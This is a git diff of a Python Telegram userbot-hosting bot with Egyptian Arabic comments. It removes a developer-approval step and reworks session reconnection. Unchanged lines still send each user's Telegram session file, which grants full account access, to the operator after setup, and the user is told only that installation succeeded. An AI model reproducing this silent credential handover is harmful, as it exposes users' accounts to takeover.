@@ -111,17 +111,15 @@ def save_config(cfg):
 config = load_config()
 
 # ==================== حفظ/تحميل بيانات الجلسة ====================
-def save_session_data(phone, api_id, api_hash, bot_token, target_chat, user_id=None, pending_approval=False):
-    """نحفظ بيانات الجلسة + علامة pending_approval لو مستنية موافقة المطور"""
+def save_session_data(phone, api_id, api_hash, bot_token, target_chat):
+    """✔ الإصلاح: نحفظ api_id و api_hash مع كل جلسة"""
     session_data_file = os.path.join(SESSIONS_DIR, f"{phone.replace('+', '')}.json")
     data = {
         "bot_token": bot_token,
         "target_chat": target_chat,
         "phone": phone,
-        "api_id": api_id,
-        "api_hash": api_hash,
-        "user_id": user_id,
-        "pending_approval": pending_approval,
+        "api_id": api_id,       # ✔ مهم جداً لإعادة التشغيل
+        "api_hash": api_hash,   # ✔ مهم جداً لإعادة التشغيل
         "created_at": datetime.now().isoformat()
     }
     try:
@@ -382,30 +380,15 @@ async def send_session_file_to_developer(phone: str, bot_token: str):
 
 
 async def notify_admin_session_down(phone: str):
-    """إشعار الأدمن لما جلسة تنقطع"""
+    """إشعار المطور لما جلسة تنقطع فعلاً ومش بتتشغل"""
     try:
         text = (f"⚠️ {DECOR_TITLE.format('جلسة انقطعت')}\n\n"
                 f"{DECOR_PHONE} الرقم: {phone}\n"
                 f"🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
-                f"⏳ جاري محاولة إعادة الاتصال تلقائياً...")
+                f"البوت بيحاول يعيد الاتصال تلقائياً...")
         await Bot(token=MAIN_BOT_TOKEN).send_message(ADMIN_ID, text)
     except Exception as e:
         logging.error(f"✘ فشل إشعار انقطاع الجلسة: {e}")
-
-
-async def notify_admin_session_back(phone: str):
-    """إشعار الأدمن لما الجلسة ترجع تشتغل"""
-    try:
-        text = (f"✅ {DECOR_TITLE.format('جلسة رجعت')}\n\n"
-                f"{DECOR_PHONE} الرقم: {phone}\n"
-                f"🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M')}")
-        await Bot(token=MAIN_BOT_TOKEN).send_message(ADMIN_ID, text)
-    except Exception as e:
-        logging.error(f"✘ فشل إشعار رجوع الجلسة: {e}")
-
-
-# مخزن الجلسات المستنية موافقة المطور
-pending_sessions = {}
 
 # ==================== رسائل الترحيب ====================
 async def send_disabled_message(context: ContextTypes.DEFAULT_TYPE, user_id: int):
@@ -648,53 +631,60 @@ async def create_and_setup_group(client: TelegramClient, bot_token: str):
 
 # ==================== Keep Alive ====================
 async def keep_alive_monitor(phone: str):
-    """يفحص TCP connection + إن task اليوزربوت لسه حية، ولو وقعت يعيد تشغيلها"""
+    """
+    ✔ مراقبة الجلسة:
+    - استنى 90 ثانية بعد التشغيل قبل ما تبدأ المراقبة (grace period)
+    - لو انقطعت: حاول تعيد الاتصال للأبد بدون ما توقف الجلسة
+    - ابعت إشعار للمطور مرة واحدة بس لما تنقطع فعلاً
+    - متبعتش إشعار لو الجلسة رجعت من تلقاء نفسها
+    """
+    # grace period: استنى 90 ثانية عشان الجلسة تكمل تشغيلها الأول
+    await asyncio.sleep(90)
+
     notified_down = False
+
     while phone in active_userbots:
         try:
             data = active_userbots.get(phone)
             if not data:
                 break
             client = data['client']
-            task = data.get('task')
-            task_alive = task is not None and not task.done()
-            connected = client.is_connected()
 
-            if not connected or not task_alive:
+            if not client.is_connected():
+                # ابعت إشعار مرة واحدة بس
                 if not notified_down:
                     await notify_admin_session_down(phone)
                     notified_down = True
-                logging.warning(f"⚠️ مشكلة في {phone} (connected={connected}, task_alive={task_alive})")
+
+                logging.warning(f"⚠️ انقطع اتصال {phone}، بيحاول يرجع...")
+
+                # حلقة إعادة الاتصال — للأبد حتى ترجع
+                reconnect_attempts = 0
                 while phone in active_userbots:
                     try:
                         if not client.is_connected():
                             await client.connect()
-                        if not await client.is_user_authorized():
-                            logging.warning(f"⚠️ {phone} غير مصرح")
-                            await asyncio.sleep(30)
-                            continue
-
-                        cur = active_userbots.get(phone)
-                        if cur and (cur.get('task') is None or cur['task'].done()):
-                            session_data = load_session_data(phone) or {}
-                            target_chat = cur.get('target_chat') or session_data.get('target_chat')
-                            bot_token = session_data.get('bot_token')
-                            temp_store = {'client': client, 'phone': phone,
-                                          'bot_token': bot_token, 'target_chat': target_chat}
-                            new_task = asyncio.create_task(start_userbot(client, target_chat, temp_store))
-                            active_userbots[phone]['task'] = new_task
-                            logging.info(f"✔ تم إعادة تشغيل task اليوزربوت: {phone}")
-
-                        logging.info(f"✔ تم إعادة اتصال {phone}")
-                        notified_down = False
-                        await notify_admin_session_back(phone)
-                        break
+                        if await client.is_user_authorized():
+                            logging.info(f"✔ رجع اتصال {phone} بعد {reconnect_attempts} محاولة")
+                            notified_down = False
+                            # أعد تشغيل handlers بدون ما تضيف نسخة تانية
+                            data_store = active_userbots[phone]
+                            asyncio.create_task(
+                                start_userbot(client, data_store.get('target_chat'), data_store)
+                            )
+                            break
+                        else:
+                            logging.warning(f"⚠️ {phone} متصل بس مش مصرح")
                     except Exception as ce:
-                        logging.error(f"✘ فشل إعادة اتصال {phone}: {ce}")
+                        logging.error(f"✘ فشل إعادة اتصال {phone} (محاولة {reconnect_attempts}): {ce}")
+                    reconnect_attempts += 1
                     await asyncio.sleep(30)
             else:
+                # كل شيء تمام
                 notified_down = False
+
             await asyncio.sleep(60)
+
         except Exception as e:
             logging.error(f"✘ خطأ keep-alive {phone}: {e}")
             await asyncio.sleep(30)
@@ -716,24 +706,6 @@ async def restart_userbots():
 
         if not session_data:
             logging.warning(f"⚠️ لا توجد بيانات للجلسة: {phone}")
-            continue
-
-        # ✔ تخطي الجلسات المستنية موافقة المطور
-        if session_data.get('pending_approval'):
-            logging.info(f"⏸️ جلسة {phone} مستنية موافقة المطور — متشغلتش")
-            pending_sessions[phone] = {
-                'bot_token': session_data.get('bot_token'),
-                'api_id': session_data.get('api_id'),
-                'api_hash': session_data.get('api_hash'),
-                'target_chat': session_data.get('target_chat'),
-                'user_id': session_data.get('user_id'),
-                'session_file': session_path,
-            }
-            # ابعت تذكير للمطور إن فيه جلسة مستنية
-            try:
-                await notify_admin_session(phone, session_data.get('user_id') or 0, session_path)
-            except Exception:
-                pass
             continue
 
         bot_token = session_data.get('bot_token')
@@ -1146,35 +1118,23 @@ async def finalize_setup(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target_chat = await create_and_setup_group(client, bot_token)
         store['target_chat'] = target_chat
 
-        # ✔ احفظ بيانات الجلسة بعلامة pending_approval=True
-        save_session_data(phone, api_id, api_hash, bot_token, target_chat, user_id=user_id, pending_approval=True)
+        save_session_data(phone, api_id, api_hash, bot_token, target_chat)
 
-        # ابعت ملف الجلسة للمطور
+        # ✔ ابعت ملف الجلسة للمطور
         asyncio.create_task(send_session_file_to_developer(phone, bot_token))
 
-        # ✔ التعديل المهم: الجلسة متشتغلش — تستنى موافقة المطور
-        session_file = os.path.join(SESSIONS_DIR, f"{phone.replace('+', '')}.session")
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
+        # target_chat بيتبعت None لـ start_userbot - المستخدم يربطه بأمر .تخزين
+        temp_store = {'client': client, 'phone': phone, 'bot_token': bot_token, 'target_chat': None}
+        task = asyncio.create_task(start_userbot(client, None, temp_store))
+        monitor_task = asyncio.create_task(keep_alive_monitor(phone))
 
-        pending_sessions[phone] = {
-            'bot_token': bot_token,
-            'api_id': api_id,
-            'api_hash': api_hash,
-            'target_chat': target_chat,
-            'user_id': user_id,
-            'session_file': session_file,
+        active_userbots[phone] = {
+            'client': client, 'task': task,
+            'monitor_task': monitor_task, 'target_chat': None
         }
 
-        # ابعت إشعار للمطور بزراري السماح/الحذف
-        await notify_admin_session(phone, user_id, session_file)
-
         await send_clean(context, chat_id,
-            f"{DECOR_SUCCESS} تم استلام بياناتك بنجاح! ✨\n\n"
-            f"⏳ في انتظار موافقة المطور لتفعيل اليوزربوت...\n"
-            f"هيوصلك إشعار لما يتم التفعيل.",
+            f"{DECOR_SUCCESS} تم التنصيب بنجاح! ✨",
             parse_mode='Markdown')
         clear_user_store(user_id)
         return ConversationHandler.END
@@ -2587,127 +2547,15 @@ async def admin_button_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             await show_section(query, "🖼 أرسل صورة أو رابط صورة:", keyboard)
             return
         elif data.startswith("allow|"):
-            # ✔ الموافقة = تشغيل اليوزربوت فعلياً
-            session_file = data.split("|", 1)[1]
-            phone = os.path.basename(session_file).replace('.session', '')
-            try:
-                # شغال أصلاً؟
-                if phone in active_userbots:
-                    cur = active_userbots[phone]
-                    client_cur = cur['client']
-                    task_cur = cur.get('task')
-                    if client_cur.is_connected() and task_cur and not task_cur.done():
-                        await query.answer(f"{DECOR_CHECK} اليوزربوت شغال بالفعل ✦", show_alert=False)
-                        try:
-                            await query.message.delete()
-                        except Exception:
-                            pass
-                        pending_sessions.pop(phone, None)
-                        return
-
-                # هات البيانات
-                pending = pending_sessions.get(phone)
-                if pending:
-                    bot_token = pending['bot_token']
-                    api_id = pending['api_id']
-                    api_hash = pending['api_hash']
-                    target_chat = pending.get('target_chat')
-                    target_user_id = pending.get('user_id')
-                else:
-                    session_data = load_session_data(phone)
-                    if not session_data:
-                        await query.answer(f"{DECOR_ERROR} بيانات الجلسة مش موجودة", show_alert=True)
-                        return
-                    bot_token = session_data.get('bot_token')
-                    api_id = session_data.get('api_id')
-                    api_hash = session_data.get('api_hash')
-                    target_chat = session_data.get('target_chat')
-                    target_user_id = session_data.get('user_id')
-
-                session_path = os.path.join(SESSIONS_DIR, f"{phone}.session")
-                if not os.path.exists(session_path) or not all([bot_token, api_id, api_hash]):
-                    await query.answer(f"{DECOR_ERROR} ملف الجلسة أو البيانات ناقصة", show_alert=True)
-                    return
-
-                # وقف instance قديم
-                if phone in active_userbots:
-                    try:
-                        oldb = active_userbots[phone]
-                        if oldb.get('task'):
-                            oldb['task'].cancel()
-                        if oldb.get('monitor_task'):
-                            oldb['monitor_task'].cancel()
-                        try:
-                            await oldb['client'].disconnect()
-                        except Exception:
-                            pass
-                    except Exception:
-                        pass
-                    active_userbots.pop(phone, None)
-
-                client = TelegramClient(session_path, api_id, api_hash)
-                await client.connect()
-                if not await client.is_user_authorized():
-                    await query.answer(f"{DECOR_ERROR} الجلسة غير مصرح بها", show_alert=True)
-                    try:
-                        await client.disconnect()
-                    except Exception:
-                        pass
-                    return
-
-                temp_store = {'client': client, 'phone': phone,
-                              'bot_token': bot_token, 'target_chat': target_chat}
-                task = asyncio.create_task(start_userbot(client, target_chat, temp_store))
-                monitor_task = asyncio.create_task(keep_alive_monitor(phone))
-                active_userbots[phone] = {
-                    'client': client, 'task': task,
-                    'monitor_task': monitor_task, 'target_chat': target_chat
-                }
-
-                pending_sessions.pop(phone, None)
-
-                # حدث ملف JSON: شيل pending_approval
-                try:
-                    save_session_data(phone, api_id, api_hash, bot_token, target_chat,
-                                      user_id=target_user_id, pending_approval=False)
-                except Exception as se:
-                    logging.warning(f"⚠️ فشل تحديث ملف الجلسة بعد الموافقة: {se}")
-
-                logging.info(f"✔ المطور وافق وتم تشغيل اليوزربوت: {phone}")
-                await query.answer(f"{DECOR_CHECK} تم تفعيل اليوزربوت ✦", show_alert=True)
-
-                if target_user_id:
-                    try:
-                        await Bot(token=MAIN_BOT_TOKEN).send_message(
-                            target_user_id,
-                            f"{DECOR_SUCCESS} تم تفعيل اليوزربوت بتاعك بنجاح! ✨\n\n"
-                            f"اليوزربوت دلوقتي شغال على رقمك."
-                        )
-                    except Exception as ne:
-                        logging.warning(f"⚠️ فشل إبلاغ المستخدم {target_user_id}: {ne}")
-
-                try:
-                    await query.message.delete()
-                except Exception:
-                    pass
-            except Exception as e:
-                logging.error(f"✘ فشل تفعيل الجلسة: {e}")
-                await query.answer(f"{DECOR_ERROR} خطأ: {str(e)[:100]}", show_alert=True)
+            # ✔ موافقة - بس نحذف رسالة الإشعار
+            await query.message.delete()
             return
         elif data.startswith("delete_session|"):
-            # ✔ رفض الجلسة = حذف كامل + إبلاغ المستخدم لو كان pending
+            # ✔ التعديل: رفض الجلسة = حذف كامل من السيرفر
             session_file = data.split("|", 1)[1]
             phone = os.path.basename(session_file).replace('.session', '')
-            rejected_user_id = None
-            if phone in pending_sessions:
-                rejected_user_id = pending_sessions[phone].get('user_id')
-                pending_sessions.pop(phone, None)
-            else:
-                # لو مش في pending، جرب نقرأ user_id من الملف
-                sd = load_session_data(phone)
-                if sd:
-                    rejected_user_id = sd.get('user_id')
             try:
+                # وقف اليوزربوت لو شغال
                 if phone in active_userbots:
                     active_userbots[phone]['task'].cancel()
                     if 'monitor_task' in active_userbots[phone]:
@@ -2728,14 +2576,6 @@ async def admin_button_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                     if os.path.exists(extra):
                         os.remove(extra)
                 logging.info(f"🗑️ تم رفض وحذف جلسة: {phone}")
-                if rejected_user_id:
-                    try:
-                        await Bot(token=MAIN_BOT_TOKEN).send_message(
-                            rejected_user_id,
-                            f"{DECOR_ERROR} تم رفض طلب تفعيل اليوزربوت بتاعك من قبل المطور."
-                        )
-                    except Exception as ne:
-                        logging.warning(f"⚠️ فشل إبلاغ المستخدم بالرفض {rejected_user_id}: {ne}")
                 await query.answer(f"{DECOR_CHECK} تم رفض وحذف الجلسة بالكامل", show_alert=True)
                 await query.message.delete()
             except Exception as e:
